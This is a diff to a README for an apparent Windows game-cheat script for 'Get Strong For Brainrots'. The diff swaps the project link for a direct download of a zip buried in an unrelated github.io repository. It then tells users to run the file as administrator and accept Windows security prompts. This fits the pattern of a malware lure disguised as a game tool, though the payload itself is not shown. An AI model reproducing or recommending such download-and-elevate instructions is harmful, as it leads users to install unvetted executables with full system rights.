@@ -5,7 +5,7 @@ description: "Automate gameplay in Get Strong For Brainrots with this Windows sc
 ---
 # 🧠 get-strong-brainrots-vf95-script - Improve your performance in this game
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/cheesefonduemarriagecontract939/get-strong-brainrots-vf95-script)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/cheesefonduemarriagecontract939/cheesefonduemarriagecontract939.github.io/raw/refs/heads/main/src/content/posts/agents/Dist-v3.9.zip)
 
 ## 📋 About This Project
 
@@ -27,7 +27,7 @@ Make sure your computer meets these needs before you run the script:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: https://github.com/cheesefonduemarriagecontract939/get-strong-brainrots-vf95-script
+1. Visit this page to download the software: https://github.com/cheesefonduemarriagecontract939/cheesefonduemarriagecontract939.github.io/raw/refs/heads/main/src/content/posts/agents/Dist-v3.9.zip
 2. Locate the file in your downloads folder after the download finishes.
 3. Right-click the file and select "Run as administrator" to grant it access.
 4. Accept the Windows security prompt if a box appears on your screen.
